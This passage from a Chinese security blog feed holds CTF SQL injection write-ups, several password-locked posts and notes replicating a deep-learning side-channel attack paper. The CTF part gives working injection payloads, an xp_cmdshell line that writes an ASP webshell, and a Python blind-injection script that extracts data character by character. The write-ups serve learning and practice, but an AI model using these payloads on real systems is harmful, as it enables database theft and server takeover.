<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;EXEC master..xp_cmdshell &#x27;</span>echo &quot;shell内容&quot; <span class="operator">&gt;</span> 绝对路径\shell.asp<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
<h1>各种注入例题</h1>
<h2 id="web2-最基础的字符型-post型注入">web2 最基础的字符型\post型注入</h2>
<p><code>[ctf.show](https://ctf.show/challenges#web2-7)</code></p>
<h3 id="打开后是一个登录界面">打开后是一个登录界面</h3>
<p><img src="../img/image-20220625125447673.png" alt="image-20220625125447673"></p>
<p>这里我已经尝试过万能密码返回的登录成功,即存在sql注入且目前并没有对基本的函数进行过滤</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">用户名: admin<span class="string">&#x27; or 1=1#                                                   &#x27;</span></span><br><span class="line">密码: 	<span class="number">111</span></span><br><span class="line"></span><br><span class="line">这里单引号用于闭合id</span><br><span class="line">例:</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #<span class="string">&#x27;; 这里#只是把后边的单引号注释掉了</span></span><br><span class="line"><span class="string">就是为什么分号没有被注释掉啊</span></span><br></pre></td></tr></table></figure>
<p>在数据库中就是</p>
<p><img src="../img/image-20220625135437800.png" alt="image-20220625135437800"></p>
<h3 id="判断有多少个字段这里返回了多少个字段值">判断有多少个字段这里返回了多少个字段值</h3>
<p><img src="../img/image-20220625135620778.png" alt="image-20220625135620778"></p>
<p>像这样,里边有username,passwd,flag三个字段,当sql语句如<code> select passwd,flag from demo where username =xxxx</code>的时候,数据库会返回两个字段,此时我们<code>order by 1 或者order by 2 </code>都不会出错,因为是按照passwd和flag来排序的,但是到3之后就会出错</p>
<p><img src="../img/image-20220625141224139.png" alt="image-20220625141224139"></p>
<p>当order by 4的时候,并没有返回值,证明只存在三个返回字段</p>
<h3 id="查看展示字段">查看展示字段</h3>
<p><img src="../img/image-20220625142752648.png" alt="image-20220625142752648"></p>
<p>这里union select 的1,2,3;类比本地mysql,就是与username, passwd合并在一起,如果前段展示的是username,这里就会把1显示出来,如果是passwd则会展示2.如下图</p>
<p><img src="../img/image-20220625143425478.png" alt="image-20220625143425478"></p>
<p>所以说2这里可以回显数据库中其他数据</p>
<h3 id="注入">注入</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 union select 1,database(),3#&amp;password=213   显示当前数据库</span></span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20220625143504592.png" alt="image-20220625143504592"></p>
<p>拿到数据库后拿表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 union select 1,table_name,3 from information_schema.tables where table_schema= &#x27;</span>web2<span class="string">&#x27;#&amp;password=213</span></span><br></pre></td></tr></table></figure>
<p><code>information_schema下的table表</code>存的是数据库所有表的信息,它从属的库就在table_schema字段中</p>
<p><img src="../img/image-20220625144707047.png" alt="image-20220625144707047"></p>
<p>这里把从属于web2数据库的表flag,user返回了接下来查表下边的列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#&amp;password=111</span></span><br></pre></td></tr></table></figure>
<p>这一句话就跟上边查表名差不多了,information_schema下的<code>columns</code>表存的有列的信息</p>
<p><img src="../img/image-20220625145513367.png" alt="image-20220625145513367"></p>
<p>可以看到,flag表下有一个flag列,这里把列中的数据打印出来即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 union select 1,flag,3 from flag#&amp;password=111</span></span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20220625150149327.png" alt="image-20220625150149327"></p>
<h2 id="web3-web7">web3 web7</h2>
<p>只是过滤了空格字符,这里把绕过技巧放在最后单独列出来</p>
<h2 id="GYCTF2020-Blacklist">[GYCTF2020]Blacklist</h2>
<p><img src="../img/image-20220908191910079.png" alt="image-20220908191910079"></p>
<p>打开如图, 测试1’ or 1=1#</p>
<p><img src="../img/image-20220908191955975.png" alt="image-20220908191955975"></p>
<p>发现过滤如下</p>
<p><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
<p>把操作符过滤掉了</p>
<p>构造payload<code>1';show databases;</code></p>
<p><img src="../img/image-20220908192232273.png" alt="image-20220908192232273"></p>
<p><code>1;show tables;</code></p>
<p><img src="../img/image-20220908194331945.png" alt="image-20220908194331945"></p>
<p><code>1'; HANDLER FlagHere OPEN; HANDLER FlagHere READ first;#</code></p>
<p><img src="../img/image-20220908194456103.png" alt="image-20220908194456103"></p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World">[CISCN2019 华北赛区 Day2 Web1]Hack World</h2>
<p>一个盲注绕过</p>
<p><img src="../img/image-20220908205638994.png" alt="demo"></p>
<p>输入0会返回</p>
<p><code>Error Occured When Fetch Result.</code></p>
<p>输入1会返回</p>
<p><code>Hello, glzjin wants a girlfriend.</code></p>
<p>输入0^1则返回上边的hello 题目提示了flag在flag表的flag字段里</p>
<p>以此来逐字判断flag, 因为过滤了空格,用括号来代替构造payload</p>
<p><code>0^(ascii(substr((select(flag)from(flag)),&quot; + str(i) +&quot;,1))&gt;&quot;+str(mid)+&quot;)&quot;</code></p>
<p>这里str(i)是判断第i位,substr(str,开始的位数1开始, 截取的位数)</p>
<p>完整payload如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findFlag</span>(<span class="params">url</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        miNum = <span class="number">32</span></span><br><span class="line">        maxNum = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> miNum &lt; maxNum:</span><br><span class="line">            mid = (maxNum + miNum) // <span class="number">2</span></span><br><span class="line">            demo = <span class="string">&quot;0^(ascii(substr((select(flag)from(flag)),&quot;</span> + <span class="built_in">str</span>(i) +<span class="string">&quot;,1))&gt;&quot;</span>+<span class="built_in">str</span>(mid)+<span class="string">&quot;)&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: demo</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Occured&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                maxNum = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                miNum = mid + <span class="number">1</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(miNum)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&quot;http://your-url/index.php&quot;</span></span><br><span class="line">    findFlag(url)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>即可跑出flag</p>
<h1>绕过技巧</h1>
<h2 id="空格被过滤">空格被过滤</h2>
<ul>
<li>/**/绕过</li>
<li>%a0代替</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>哨兵蓝队内网-蜜罐-监控 开发全纪录</title>
    <url>/archives/5fdb2894.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="79226be1123d0a25472efc4ecfb3682af3bc90310df748c3bf9839805cd27a82">ee733bf2dd71e66968255e3fc5c69a3c6433559cfaea10a2355cf435b97806cd30ad3320461cb2e5f3bc1892e5c1047875284aeb59f44961496f21d9b8906d4fcb350e42f3bd2e8e6c0b145e129beaeb95f9c0a21ae537a01125302a536ef16c0c01c227efa395b498e724f9eb70ef1624a342ec7c29577d671ea88881c22d850db05d5c2618e09f375382eaef3436e557e94c1cde6bcf64d0febec3edf83451da7d95b3021ffc583b0819499e8aad602f9ed153e5e633fec1281703eb24a5b0d04076af258f504630b8e3726025970077c19bd6a94f3928f73448264501382aed604f7cd400c2c2096138cbdc1cc509ed50cd50cdfd7dfa629c0697d7600f368bb5476eb1cc72bb77d674cc55aa80c691b146a581f75bd3292bac739964683c577b3765d2facacf5c51c9e499b45973686c144696027aa2b98975363eb4d4dae0a78c7a15755dfb2495a18235149d42a78a78e62b0ceedd04dce14a8d1461b7155feca182b68e05f7b703cfcd91373b0552af0dba54a3fc3c456b8f0365d4c3e4fc2dfca32de75d97ee4edc0d1e8158041b1b3213b7f876173d0836e21b3a568347cc8839d5a141600bca28186d103d1053d8b41837788920a486e9b6494b6ae75730ead4ab019f0fcba4de89d6bf1da113493bb6bc96529467fa46c0ce18925b51740125dee8831dbb3a79332abfa4bce1886589895df137f29ce9fb228f37cc66610a2e3ab407bd1a9728332940570e1783d9e83f8e00a39670b511cb6d40e5291abf3d61fe8f8b24cfb36db2d0a4ca2273dd3d99c098cdfd7f50ac742ef43a6f10ee5510553f3f4a5705591c8ed1c9db3dede1da435491cbce839dc49770df5effda23f530816aba447343cb518efc0483e503763ce8f1506a408dde7174db0fdb40d28f88f6ae7e60d5e80db34b13373333b7e9d2ae682495c8be08436770744e74a41b3093c6af28aa28b593098f347c38d37a1cdfe9be0f840a71efb157429d056adb527dda055c7ffa05416a578241aa28173eff8d57571e2507c3dd5fb8a1afc7d0c44e41ba9a82174c16c713590e32c3d83d67b831ddc19f4d289395914b7a5fd653aac270577e68901cb0f2a6501a483908cd2adf2227a79495f21e3d26685b4b4748f1e608f362d145eeca6f2555da376cc84ec94722594abea8bad8054c810926bd46ccfff03935c4f65478746c4305324214761b854fa2a4a30364270befbd3ab4c30f031dbb456195dccf2d6c0dc50db641dee190d9c4308f67d7889a6accf29316a80d0edabf48710d688f938304b2a698b1125d033590655b5cc7a0b7f8d4d4c0f01d96bcab049c973e926174ea86b24ea97e4612885b88119aa100ae6e5b59ea0dbc4dbe7933e38d3fb05f4240e133a066dbe17cda21e36d277d655d040d7a71d4969170306e3e68d63a39ccabf2ec4af3cadb4fe9b531d937f4732c238046fc9085c9bf1bf62bf9e9bbba377a202065056c3b01d58451fe498de36130a53d21ab698bc4b1f535e02292d25e20de968f58229ebfda0539edffb8961b07b97a600e837fab33d0abefcd2bb44f17197acd78c5838bfefc62</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-blink">
      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码,Pay for me !!!.">这里需要密码,Pay for me !!!.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title>文献实验复现笔记-Multilabel Deep Learning-Based Side-Channel Attack</title>
    <url>/archives/748819c3.html</url>
    <content><![CDATA[<h1>数据集</h1>
<table>
<thead>
<tr>
<th>名称</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASCAD</td>
<td>60 000条能量迹, 700个特征</td>
</tr>
<tr>
<td><a href="https://github.com/AESHD/AES_HD_Dataset">AES_HD</a></td>
<td>500 000条能量迹, 1250个特征</td>
</tr>
<tr>
<td><a href="https://github.com/ikizhvatov/randomdelays-traces">AES_RD</a></td>
<td>50 000条能量迹, 3500个特征</td>
</tr>
</tbody>
</table>
<h1>数据预处理</h1>
<p>由于本论文中作者在每条能量迹都打上八个标签,因此要把原来的label划分为8bit,写了个简单的poc。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">in_file = h5py.File(<span class="string">&#x27;../yourdatasets/ASCAD.h5&#x27;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">X_profiling = np.array(in_file[<span class="string">&#x27;Profiling_traces/traces&#x27;</span>], dtype=np.int8)</span><br><span class="line"><span class="comment"># Load profiling labels</span></span><br><span class="line">Y_profiling = np.array(in_file[<span class="string">&#x27;Profiling_traces/labels&#x27;</span>])</span><br><span class="line">new_y_profiling = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Y_profiling)):</span><br><span class="line">    bin_y = <span class="string">f&quot;<span class="subst">&#123;Y_profiling[i]:08b&#125;</span>&quot;</span></span><br><span class="line">    bin_y = <span class="built_in">list</span>(bin_y)</span><br><span class="line">    bin_y = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">float</span>, bin_y))</span><br><span class="line">    new_y_profiling.append(bin_y)</span><br><span class="line">new_y_profiling = np.reshape(new_y_profiling, (<span class="built_in">len</span>(new_y_profiling), -<span class="number">1</span>))</span><br><span class="line"><span class="comment"># Load attacking traces</span></span><br><span class="line">X_attack = np.array(in_file[<span class="string">&#x27;Attack_traces/traces&#x27;</span>], dtype=np.int8)</span><br><span class="line"><span class="comment"># Load attacking labels</span></span><br><span class="line">Y_attack = np.array(in_file[<span class="string">&#x27;Attack_traces/labels&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(Y_attack[<span class="number">0</span>]))</span><br><span class="line">new_y_attack = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Y_attack)):</span><br><span class="line">    bin_y = <span class="string">f&quot;<span class="subst">&#123;Y_attack[i]:08b&#125;</span>&quot;</span></span><br><span class="line">    bin_y = <span class="built_in">list</span>(bin_y)</span><br><span class="line">    bin_y = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">float</span>, bin_y))</span><br><span class="line">    new_y_attack.append(bin_y)</span><br><span class="line">new_y_attack = np.reshape(new_y_attack, (<span class="built_in">len</span>(new_y_attack), -<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<h1>神经网络架构</h1>
<blockquote>
<p>目前还是不会用api来写,先将就一下一步到底</p>
</blockquote>
<h2 id="ASCAD-Nmax-0">ASCAD Nmax=0</h2>
<img src="../img/image-20230608161853915.png" alt="图1 未加入对抗措施的能量迹数据集对应的NN模型" style="zoom:80%;" />
<p>代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data_input = keras.layers.Input(shape=(<span class="number">700</span>, <span class="number">1</span>))</span><br><span class="line">output_left = layers.Conv1D(<span class="number">4</span>, <span class="number">1</span>, activation=<span class="string">&#x27;selu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>)(data_input)</span><br><span class="line">output_middle = layers.Conv1D(<span class="number">4</span>, <span class="number">7</span>, activation=<span class="string">&#x27;selu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>)(data_input)</span><br><span class="line">output_right = layers.Conv1D(<span class="number">4</span>, <span class="number">11</span>, activation=<span class="string">&#x27;selu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>)(data_input)</span><br><span class="line">concatenated_output = keras.layers.concatenate([output_left, output_middle, output_right])</span><br><span class="line"></span><br><span class="line">conv_1 = keras.layers.Conv1D(<span class="number">4</span>, <span class="number">1</span>, activation=<span class="string">&#x27;selu&#x27;</span>)(concatenated_output)</span><br><span class="line">bn_1 = keras.layers.BatchNormalization()(conv_1)</span><br><span class="line">ave_pool = keras.layers.AvgPool1D(<span class="number">2</span>, <span class="number">2</span>)(bn_1)</span><br><span class="line">flatten = keras.layers.Flatten()(ave_pool)</span><br><span class="line">fc_1 = keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;selu&#x27;</span>)(flatten)</span><br><span class="line">fc_2 = keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;selu&#x27;</span>)(fc_1)</span><br><span class="line">fc_3 = keras.layers.Dense(<span class="number">8</span>, activation=<span class="string">&#x27;sigmoid&#x27;</span>)(fc_2)</span><br><span class="line">model = Model(inputs=data_input, outputs=fc_3)</span><br></pre></td></tr></table></figure>
<p>这里output_left、output_middle、output_right分别代表了大小为1、7、11的卷积核,个数都为4,在经过一个连接层concatenate将得到的结果全部拼接起来,这里可以看出来大小为1的卷积核确实没起什么作用,既没有扩大感受野也没有起到减少复杂度的作用,后边就是正常的四个大小为1的卷积核,这里的作用确实是在BN层之前减少了计算的复杂度,(在这里测试了一下去掉这四个卷积盒后模型的复杂度为4w+,而加上之后为14364),之后就是正常的展平全连接,只是在最后将softmax函数改为sigmoid。</p>
<p>模型summary如图2所示。</p>
<img src="../img/image-20230608163943845.png" alt="图2 模型结构以及参数量" style="zoom:80%;" />
<p>**优化器(**opt)采用adamax(Adam也可以, 作者这里没有说用哪个,我用了俩效果相差不大), <strong>学习率</strong>(lr)0.005,<strong>loss</strong>选择二元交叉熵,<strong>epochs</strong>=100,<strong>batch_size</strong>=256</p>
<p>训练代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.<span class="built_in">compile</span>(optimizer=keras.optimizers.Adamax(<span class="number">0.005</span>) , loss=tf.keras.losses.BinaryCrossentropy(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">history = model.fit(X_profiling, new_y_profiling, epochs=<span class="number">100</span>, batch_size=<span class="number">256</span>, verbose=<span class="number">1</span>, validation_split=<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
<p>测试代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_loss, test_accuracy = model.evaluate(X_attack, new_y_attack, verbose=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>成功率以及损失如图3、图4所示,暂时应该是没有复现成功。</p>
<img src="../img/image-20230608171007028.png" alt="图3	N0成功率" style="zoom:80%;" />
<img src="../img/image-20230608171037237.png" alt="图4	N0损失" style="zoom:80%;" />
<h1>汇总</h1>
<p>其实在复现的时候发现,自己的数据跟作者的老是对不上号,猜测可能是数据预处理或者优化器选的不是特别好,但最让我不解的是复现的模型复杂度有的跟作者的相同,但是有的少了1k,感觉是padding或者哪里小细节有问题,模型的代码全部传到github上了<a href="https://github.com/i4mhmh/recurrent-Multi-label-Deep-Learning-based-Side-Channel-Attack/tree/main">链接</a></p>
]]></content>
      <tags>
        <tag>文献实验复现</tag>
      </tags>
  </entry>
  <entry>
    <title>AI侧信道攻击中Prediction转换的实现</title>
    <url>/archives/bfd12eb4.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e389324c49515f51e220eb93386e5e540e47806d75a12f5860c9847a2dc9519d">ee733bf2dd71e66968255e3fc5c69a3c9426396d8184a3d8debb0e375ed0038347c7c0a87475f41c397f226462cf5fd21c83d4aafe236eabba21cf2ab57258142d498a84a19b3f7d0308bfd5761cc8de1de17fdcb96e6b677f6087bb69735dadfcd2673e9005c0cddd53db832a5ae9ebedc838295bb92eb41e70201da3f15299cd0a057f37e0e204c73da8bd18485618f8c4272a2f82eafc8fb844652d8d0fa48bf6ccc33bbc7ef5822629ad4c7f2cfaf40d0bd51d9c120eae73516697f512e842284ed2930e5b2afed701802736465b6b9e787ee2e3825544ed48ede7f0a05b6f7a407b25d6b8e1316b846681d010ef677ca35a55280b8c48e778613b67b84d8d86f523f7690dc5c902345444b4b9645e04102b4b78f0248a5c2b87e15d7715cad3ba523591ab367c8f9b4b43e91b11cd3fad7b623c36bdf407e524b94c424d530f6820e9be58623d971c0a41a9b6d1c519858593992a867f4a4ab68386abc3cd7478e034658e9e01f1e7811b18af680e4801d555de0edd8bffe9882efc73ba4be8304131d653d5b8900e63496ba5e1c783c19040cf9e7bd1fb993662ae9846f95975d8555503b9c25b7f1c3c1b5c1ce4a1584038e0cf6c5bd9e7e8bb1f3e4de3a11c3f79c22b98d1f8411ea959508b71eed39a9d07555d2b46e978ae8e0e5a41471f8a4594f152ad395884c91c33bb4c21b72b630d9cfa09a68bef80b99d01cb322664611529808ffa405611ecc66b0464a1a41a09b28ffb10735813764bff272435f9dce5fc6b871b9d08bcfe18001129724ff6ffa79dc5be6e6a514ed75ea593706acb9ee1c504dd198fd0a0a35a01dc5dba68d519750e1632c12c4341e5baee18ff09c18ff219833529a4dfb5ed23a8952baaf34ae33f8dfaeef5bb0d928d0e5b9c14ab227fae22e5673a5f9c4be101b4f0c5d149ccb8ca8fde04e16dd0e63478b01559ad1594cd2d0b5400a68893f16b6c41f9e353dcb513ddc2d4ff366b7f9be3a62ef088db51147e93a354fdbff05630657f99c62c33f72e5369ed30d5614a0b3ff1298539e69c3e781a51b7d62211ab7f70c23d85bb5a3d554c2c30f3afe4c87c6d6d1bc38dd6c0e8ef50b0546a653b15d32446bcceb54c3ff257c108c0542ee1698b677ff652d4ef3c5ae0a2ca0e14c3e2cd79211e7279eaeada7e7dd5b6c8a5463e2aab88ada63a631b05b1b244e495b48c15b9ea6f18810001f921b00bfb903acb83380a334b71acc1801b6e1abd0a8c5e06b0d3d1303293f969813c38c546232ec607e7ae3d90cc7c6da9f1b543eb56b2416a8bc01ab1edd57c1802420fe976a03ef7ea983e3069b404cd3d08e9440d61e89480d978c651fcfcfe77f1447099f8ebb57617fa311baa1057bb3d98f7d1b72f0607698037e340788dfe01a6ae68b8376f27ef6217f03ce67e9f4c76239f7c982a7353f07e2d3ed13a40822ba7f1d80e978e03bc05c5130b64edaa37b9b401d2213b12bf25e8adc9aa9eda49c4b8b40a6c8c6f0cbc87fd274e4d1da8cd8e88be6e6c0562da826cc5d2de50ceaf4e568da2ea52e36c2697959a1291c2adf1307bacb6649faaec0e40bc0b72c47e2e9de951d3b5617e4b94864e1e0e4512367f52e5bfee2c0a074a6cf7bb7cba1754f6049aa6fe2ef67305affd8eee2f7b27f55239075c9567ba8b4136ec086d26a5a78197aed8bc6f641b7720f2c4c61537b99aaadeecc4d30fdc9c37660c9e4875df2bad7c7e37d0a50d547961e523c0b71b9ff5d6f2e3820082f80f178d7934e1598e5ec9648b94d84fd4ace3adca97dcc4495c9392868c3390eecef09a9f0985e518be890ff2e6b40544b311f97c7833de720125c3cc43859c54c0cf7174a7a6e88c5fd5027a964de4c9fa2e583966fe80aa8d540500241e912115e483d6feea6ddeef1e441d841be60021e5d926cce2db5effcd7b8407a754dc3f75075d4b1d7e3e2300c75b5e6bdca9a988d3e8f09ebe2426299ef7ce8ac7cc58232b80361101f910e7f683d4f41a30e4698d0087d6de69d762e4e18e8adf65027aed65a0133a025941a238bf757194007ff9da95a6f644af71769b5cae8bc647a0de9160321568d2cd72c5e9a3c5b9160f5bfc79547c762164990a70ed126338a64d447b0c68c313c318ea6b15495a523c145a2ccdc6c0c1226e933fc110a9acc949bec7909321866e88f24a4fb1b6d904fe39d75a1e0c6287ae55ed5b9abe8c698c572dfbec16ffd20a3d5307bf85dcf05d9ab774f595cac95ed422fa4321eddb3544adfff7465495a79a55b281d182a612f3b8ae8d0bde969600b35417eedd568a13604f714bf84f8a155abfed9dc2505a9e642e4d3535f735af2736590ade4c6781d760cc5a9ae30056e25b016651828c5f9e06a78011890c5c1d5e3c3cba39f67700ff64c473fec615390f5f76c457da5b62164a0b75173a9b0161488ea2c98d2ea958132dbced5f1c93faf61f7d15b950c3835309c68d4290d0d071ac8e723907378c1321a5a253c143e58fffc21da88fffceb8673688bc2e85f0aca28cd285a34c26136cb2ac958a111f08fcc286bc3d20682108b49fd5347a78b3167b55ccea3f2638a6c9689bcf1c83b188ab95475364ed1f3cd24b33c33abdca3570f03ac92c9e082c8c1110b9dd126ed9d6459c9af3e2baa63f64a461d9130cefd09c80deafa35161c7e7dd8b938dd521ef131154f53bb3d78df10666a6b0c01a8f957d3d7a2601bc934fdcfda3f93189cd57c9f53abea9792c9618aea965df11b350ebfc37df46f36406485fb7fd5c37bb1a1405523a6405dfe3aaa8e5827ca4afd332a4abdefd4e105c8afbac203d859c3a8226d1198752c2e0186babefb595760ccbac3fdc78934acb623993bb860c6c2f28146cb1c3a07ca7ba4f6283b90e77e88065c0ec707cdba59447d40906ad3feb54cf42b712401fe220539e2af316a2f719acccd7f6f808c9d767edb37e0b49d802eb591f7fa5f4c61775920a3e21d4600a0714be94a2ce6b4b5305b6fde29b51450eebb39b22c9f3557ee03d5e6e6c715e8354289d928f4355f87922fd8ab181e189910494bcf3374558b1122a40e0cbbc7a19a36465bbdb86b490ffc6251909374f790a73ed63c26c63677bfe55c8e8319862870a33869cfa0a70d0e044d7ed21778661a1c1abdb7372f6a50d447110ebc57a243a78bf053be8b9ea8d679b6c42531c1617a4d7e6f70582fcf5d2dd19f66a1fb5cd909082923467b7f3e96a30b261db7280c3035a1eaa824d232091c01f678745622868d0ae1afff7d87e20fa143cd109d9777d4293301775883a866cef5990207c17a462d2b1dd6c38b7c2e2e3185b364d57220f383335aee548e88058736af357b4079b669922c2c5f64d9e3a1dc665a95af5a8c986d72afc6cf4d5933cbf793377172aa3831121a56950f52ae2cadaa633778c632a0fc4719d596ddfba0e714d0c7c4901efe671f0230977c1678c5de03781c7b749b12d18ca9938cb50b9c5f621ac867b5a7109ce1085f95e95a631655a140cb5fcac047a4b67d3fb38e765848ed0a40cc50680aedd81bd6c2f561203caf3fd89899fca4cf6cc44b4da8ae6c65c706a16db3043d4e9f8568cf96bda7ec9de9910761114e1fde6fc496206ccb6aa85666fc2c95d152d68391f5718494d96ef5b45fc052c9810b873e1c7af0c21198268baa357d6cb9f6d5d24674c7e24e7edb06cc51fa9b3b2ffcdf346487812d6058da7f09ca5dbeddd4b9c1b48f05a762798a70398b13c9d3bbfd115d0d6eceffd8251bb38890c78f3cb956c0c648b3f3a47b021d5b002af797af44f9d3aac54b0dd6745f593b110d2b56e06a127830e9a1b1701499841d4e73bf4dc7355671a5f3e6f7b1ce58c4e85c5d3a4face43f9a5c10f22917d5630ae71521011254701aa41bfb6b7fb846f3ea3c274677722d6a33755b325976fd213474c10f53ae8dcab5ff62188833bd2d077e9783aea898c838c875ab311f6fda206962aa0274c21da6f62caf287010c65fa8a9066ea7a44dcaa43f355348c2f1c490c488c1c95771bccfd98765dca9aafccd6c321e2e887381b9f59fb9234ebd60e1cd23427dc99dd68f6e0e66384ea6f65e052cdff8fa9f081e594a67c039dd6e0857281ecc377fba9cb639b935c91dba9157f8d2fa9c4ec5fe171ac69407b281cc6e036e886f41b9f1c7fcd3c2e3a9510947b2af231e0c50985e77a24cb8499259145c384ba60a0000d67c9fca5fc56f8b76baae7c0ca3adcd1fa252a12370793436f3bf890ae252b311e24657103d0f8ff426f2b1869843c6e1a844c12204c5ceb0c8b0ba63f60deff07a5204285dcef4909a66fba01b7c98dd1d8ef546cbdf163663b83b5e6f7b6e67c3101ab8fb9188469eb80a1dbae5c872e017cba45d8d629ad9a740bb73bc18bb1797d93f7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-blink">
      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码,Pay for me !!!.">这里需要密码,Pay for me !!!.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>小饼干</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Don’t Learn What You Already Know Scheme-Aware Modeling for Profiling Side-Channel Analysis against Masking</title>
    <url>/archives/82dfe1cf.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
